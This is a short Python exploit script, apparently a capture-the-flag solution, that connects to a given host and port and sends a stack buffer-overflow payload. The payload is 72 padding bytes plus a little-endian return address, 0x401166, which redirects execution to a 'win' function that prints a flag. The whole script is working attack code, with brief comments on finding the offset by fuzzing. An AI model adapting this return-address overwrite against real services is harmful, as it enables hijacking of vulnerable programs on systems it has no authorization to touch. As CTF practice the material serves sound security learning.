import argparse
import socket

parser = argparse.ArgumentParser()
parser.add_argument('host', type=str, help="Hostname or IP Address")
parser.add_argument('port', type=int, help="Port to connect to")

args = parser.parse_args()
print(args)

offset = 72 # 0x616161616161616a

#vulnerable_function attempted to return to 0x616161616161616a wwhen fuzzing
#Challenges states address of secret is 0x401166, lets try to return to this address

win = 0x401166

#due to endianess we will flip the return address and we know the file is compiled 64 bit
payload= b'A' * offset + b'\x66\x11\x40\x00\x00\x00\x00\x00' + b'\n'

with socket.socket() as conn:
	conn.connect((args.host, args.port))
	print(conn.recv(4096).decode())
	conn.send(payload)
	print(conn.recv(4096).decode())
	print(conn.recv(4096).decode()) #Prints Flag
